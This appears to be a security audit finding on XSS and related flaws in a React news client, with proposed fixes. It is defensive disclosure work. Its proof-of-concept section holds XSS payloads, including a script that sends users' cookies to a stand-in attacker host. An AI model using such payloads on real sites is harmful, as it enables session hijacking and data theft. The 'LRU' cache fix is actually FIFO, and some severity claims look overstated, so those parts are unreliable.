# Multiple Critical XSS Vulnerabilities in News Client Application

**ID:** vuln-0004
**Severity:** CRITICAL
**Found:** 2025-09-01 03:15:08 UTC

## Description

VULNERABILITY SUMMARY
Multiple critical Cross-Site Scripting (XSS) and related security vulnerabilities have been identified in the news client application. These vulnerabilities could allow attackers to execute arbitrary JavaScript code in users' browsers, leading to account compromise, data theft, and other malicious actions.

AFFECTED COMPONENTS
1. hackerNewsApi.ts
2. StoryList.tsx
3. Comments.tsx

DETAILED FINDINGS

1. CRITICAL: Multiple Stored XSS Vulnerabilities
Location: Multiple components
Impact: Critical - Remote Code Execution in Browser

Vulnerable Code:
- Comments.tsx (Line 124):
```typescript
dangerouslySetInnerHTML={{ __html: formatCommentText(comment.text || '') }}
```
- StoryList.tsx (Line 237):
```typescript
dangerouslySetInnerHTML={{ __html: story.text }}
```

Issue: User-generated content is rendered directly as HTML without sanitization. The formatCommentText function only decodes HTML entities but does not sanitize the content.

2. CRITICAL: Unsafe URL Handling
Location: hackerNewsApi.ts
Impact: High - Potential SSRF and XSS

Vulnerable Code:
```typescript
const proxyUrl = `https://api.allorigins.win/get?url=${encodeURIComponent(url)}`;
```

Issue: URLs are only encoded but not validated before being passed to external services. This could lead to SSRF attacks and potential XSS through malicious URLs.

3. HIGH: Unsafe HTML Parsing
Location: hackerNewsApi.ts
Impact: High - HTML Injection

Vulnerable Code:
```typescript
const descMatch = html.match(/<meta[^>]*name="description"[^>]*content="([^"]*)"[^>]*>/i);
```

Issue: Using regex to parse HTML is unsafe and could lead to HTML injection attacks.

4. MEDIUM: Memory Leak in Caching
Location: hackerNewsApi.ts
Impact: Medium - Resource Exhaustion

Vulnerable Code:
```typescript
private summaryCache = new Map<string, string>();
```

Issue: No cache size limits or expiration mechanism, potentially leading to memory leaks.

5. MEDIUM: Unsafe Error Handling
Location: Multiple components
Impact: Medium - Information Disclosure

Issue: Error details are logged to console and sometimes displayed to users, potentially leaking sensitive implementation details.

PROOF OF CONCEPT

1. XSS via Comments:
```html
<img src=x onerror="alert(document.cookie)">
```
This payload, when posted as a comment, would execute arbitrary JavaScript due to lack of sanitization.

2. XSS via Story Text:
```html
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```
This payload in story text would be executed due to unsafe rendering.

RECOMMENDATIONS

1. Immediate Actions:
   - Implement HTML sanitization using DOMPurify or similar library
   - Replace all dangerouslySetInnerHTML with safe alternatives
   - Add proper URL validation and allowlisting

2. Code Changes Required:
```typescript
// Before (unsafe)
dangerouslySetInnerHTML={{ __html: comment.text }}

// After (safe)
import DOMPurify from 'dompurify';
<div>{DOMPurify.sanitize(comment.text)}</div>
```

3. URL Handling:
```typescript
// Add URL validation
const isValidUrl = (url: string): boolean => {
  try {
    const parsed = new URL(url);
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch {
    return false;
  }
};
```

4. Caching Improvements:
```typescript
class LRUCache<K, V> {
  private cache = new Map<K, V>();
  private readonly maxSize: number;
  
  constructor(maxSize: number) {
    this.maxSize = maxSize;
  }
  
  set(key: K, value: V): void {
    if (this.cache.size >= this.maxSize) {
      const firstKey = this.cache.keys().next().value;
      this.cache.delete(firstKey);
    }
    this.cache.set(key, value);
  }
}
```

5. Additional Security Measures:
   - Implement Content Security Policy (CSP)
   - Add X-Frame-Options header
   - Implement proper input validation for all user inputs
   - Add rate limiting for API requests
   - Implement proper error handling without leaking details

IMPACT
If exploited, these vulnerabilities could allow attackers to:
1. Execute arbitrary JavaScript in users' browsers
2. Steal user session cookies and hijack sessions
3. Perform actions on behalf of users
4. Access sensitive information
5. Launch phishing attacks from the trusted domain

TIMELINE
- Immediate action required
- Temporary mitigation: Disable HTML rendering and fall back to plain text
- Long-term fix: Implement all recommended security measures

These vulnerabilities require immediate attention as they pose a significant risk to user security.
